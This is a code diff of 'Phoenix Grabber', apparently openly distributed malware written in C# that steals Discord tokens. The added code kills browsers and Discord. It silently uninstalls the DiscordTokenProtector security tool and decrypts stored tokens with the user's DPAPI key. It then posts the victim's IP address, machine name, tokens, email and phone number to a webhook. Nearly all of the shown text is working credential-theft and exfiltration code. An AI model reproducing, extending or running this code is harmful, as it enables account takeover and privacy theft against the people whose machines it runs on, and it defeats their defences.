@@ -23,21 +23,34 @@ namespace Program
         #region Main
         static void Main()
         {
-            Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("BouncyCastle.Crypto.dll");
-            BinaryReader br = new BinaryReader(stream);
-            FileStream fs = new FileStream("BouncyCastle.Crypto.dll", FileMode.Create);
-            BinaryWriter bw = new BinaryWriter(fs);
-            byte[] ba = new byte[stream.Length];
-            stream.Read(ba, 0, ba.Length);
-            bw.Write(ba);
-            br.Close();
-            bw.Close();
-            stream.Close();
-            File.SetAttributes("BouncyCastle.Crypto.dll", File.GetAttributes("BouncyCastle.Crypto.dll") | FileAttributes.Hidden);
+            BouncyCastle();
+            KillProcesses();
+            AntiProtector();
             Start();
+            SendInfo();
             //SpreadMode
             //RunOnStartup
             //FakeError
+        }
+        #endregion
+
+        #region BouncyCastle
+        static void BouncyCastle()
+        {
+            if (!File.Exists("BouncyCastle.Crypto.dll"))
+            {
+                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("BouncyCastle.Crypto.dll");
+                BinaryReader br = new BinaryReader(stream);
+                FileStream fs = new FileStream("BouncyCastle.Crypto.dll", FileMode.Create);
+                BinaryWriter bw = new BinaryWriter(fs);
+                byte[] ba = new byte[stream.Length];
+                stream.Read(ba, 0, ba.Length);
+                bw.Write(ba);
+                br.Close();
+                bw.Close();
+                stream.Close();
+                File.SetAttributes("BouncyCastle.Crypto.dll", File.GetAttributes("BouncyCastle.Crypto.dll") | FileAttributes.Hidden);
+            }
         }
         #endregion
 
@@ -46,15 +59,6 @@ namespace Program
 
         static void Start()
         {
-            string[] processlist = { "Discord", "DiscordCanary", "DiscordPTB", "Lightcord", "opera", "operagx", "firefox", "chrome", "chromesxs", "Yandex", "msedge", "brave", "vivaldi", "epic" };
-            foreach (Process process in Process.GetProcesses())
-            {
-                foreach (var name in processlist)
-                {
-                    if (process.ProcessName == name)
-                        process.Kill();
-                }
-            }
             List<string> locations = new List<string>();
             var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
             var localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
@@ -93,7 +97,7 @@ namespace Program
                     {
                         foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), "(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)"))
                         {
-                            dynamic deserialize = new JavaScriptSerializer().DeserializeObject(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State"));
+                            dynamic deserialize = new JavaScriptSerializer().DeserializeObject(File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local State"));
                             AeadParameters parameters = new AeadParameters(new KeyParameter(ProtectedData.Unprotect(Convert.FromBase64String((string)deserialize["os_crypt"]["encrypted_key"]).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser)), 128, Convert.FromBase64String(match.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]).Skip(3).Take(12).ToArray(), null);
                             GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                             cipher.Init(false, parameters);
@@ -107,7 +111,6 @@ namespace Program
                 }
                 else
                 {
-
                     foreach (var file in new DirectoryInfo(path).GetFiles())
                     {
                         if (file.Equals("LOCK")) continue;
@@ -119,10 +122,67 @@ namespace Program
                     }
                 }
             }
-            var result = string.Join("\\n", tokens.ToArray());
-            if (string.IsNullOrEmpty(result))
-                result = "N/A";
-            Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | " + DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss") + "\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"IP Address\",\"value\":\"" + IP() + "\"},{\"name\":\"Tokens\",\"value\":\"```\\n" + result + "\\n```\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
+        }
+        #endregion
+
+        #region Send Info
+        static void SendInfo()
+        {
+            Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | " + DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss") + "\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"IP Address\",\"value\":\"" + IP() + "\"},{\"name\":\"Computer Name\",\"value\":\"" + Environment.MachineName + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
+            if (tokens.Count != 0)
+            {
+                foreach (string token in tokens)
+                {
+                    var request = Request("/users/@me", "GET", token);
+                    dynamic info = new JavaScriptSerializer().DeserializeObject(request);
+                    var email = info["email"];
+                    if (string.IsNullOrEmpty(email))
+                        email = "N/A";
+                    var phone = info["phone"];
+                    if (string.IsNullOrEmpty(phone))
+                        phone = "N/A";
+                    var request2 = Request("/users/@me/settings", "GET", token);
+                    dynamic info2 = new JavaScriptSerializer().DeserializeObject(request2);
+                    var status = info2["status"];
+                    if (string.IsNullOrEmpty(status))
+                        status = "N/A";
+                    Request("//Webhook", "POST", null, "{\"embeds\":[{\"footer\":{\"text\":\"Phoenix Grabber | github.com/extatent\"},\"author\":{\"name\":\"Phoenix Grabber\",\"url\":\"https://github.com/extatent\"},\"fields\":[{\"name\":\"Email\",\"value\":\"" + email + "\"},{\"name\":\"Phone Number\",\"value\":\"" + phone + "\"},{\"name\":\"Status\",\"value\":\"" + status + "\"},{\"name\":\"Token\",\"value\":\"" + token + "\"}]}],\"content\":\"\",\"username\":\"Phoenix Grabber\"}");
+                    Thread.Sleep(200);
+                }
+            }
+        }
+        #endregion
+
+        #region Kill Processes
+        static void KillProcesses()
+        {
+            string[] processlist = { "discord", "discordcanary", "discordptb", "lightcord", "opera", "operagx", "firefox", "chrome", "chromesxs", "chromium-browser", "yandex", "msedge", "brave", "vivaldi", "epic" };
+            foreach (Process process in Process.GetProcesses())
+            {
+                foreach (var name in processlist)
+                {
+                    if (process.ProcessName.ToLower() == name)
+                        process.Kill();
+                }
+            }
+        }
+        #endregion
+
+        #region Anti Protector
+        static void AntiProtector()
+        {
+            foreach (Process process in Process.GetProcessesByName("DiscordTokenProtector"))
+                process.Kill();
+
+            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector\\unins000.exe"))
+            {
+                Process process = new Process();
+                process.StartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\DiscordTokenProtector\\unins000.exe";
+                process.StartInfo.Arguments = "/verysilent";
+                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                process.Start();
+                process.WaitForExit();
+            }
         }
         #endregion
 
@@ -179,8 +239,7 @@ namespace Program
                 try
                 {
                     var request = Request("/users/@me/channels", "GET", token);
-                    var serializer = new JavaScriptSerializer();
-                    dynamic array = serializer.DeserializeObject(request);
+                    dynamic array = new JavaScriptSerializer().DeserializeObject(request);
                     foreach (dynamic entry in array)
                     {
                         try
